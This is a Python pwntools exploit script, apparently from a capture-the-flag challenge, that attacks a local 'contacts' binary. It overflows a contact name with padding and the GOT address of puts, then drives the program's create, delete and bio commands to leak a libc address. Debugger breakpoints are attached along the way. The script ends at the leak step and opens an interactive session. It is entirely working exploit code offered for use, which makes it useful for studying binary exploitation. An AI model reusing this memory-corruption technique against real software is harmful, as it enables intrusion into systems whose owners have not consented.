from pwn import *


GOT_PUTS = 0x602020


p = process(['./ld-linux-x86-64.so.2', './contacts'],  env={'LD_PRELOAD':'./libc.so.6'})


def create(name):
    p.recvuntil('> ')
    p.sendline('create %s' % name)


def bio(name, b, size=None):
    size = size or len(b)
    p.recvuntil('> ')
    p.sendline('bio %s' % name)
    p.sendline('%s' % size)
    p.sendline('%s' % b)


def delete_bio(name):
    p.recvuntil('> ')
    p.sendline('-1')


def delete(name):
    p.recvuntil('> ')
    p.sendline('delete %s' % name)


def display():
    p.recvuntil('> ')
    p.sendline('display')



GDB = """
b *0x0400956
c
"""
gdb.attach(p, GDB)

n = 152*'X'
n += p32(GOT_PUTS)
create(n)
delete(n)
create('b')
bio('b', 'BXBX', 99)
create('leak')
display()
p.recvuntil('leak - ')
puts_addr = p.recvn(6).ljust(8, '\x00')
info(hex(u64(puts_addr)))

p.interactive()
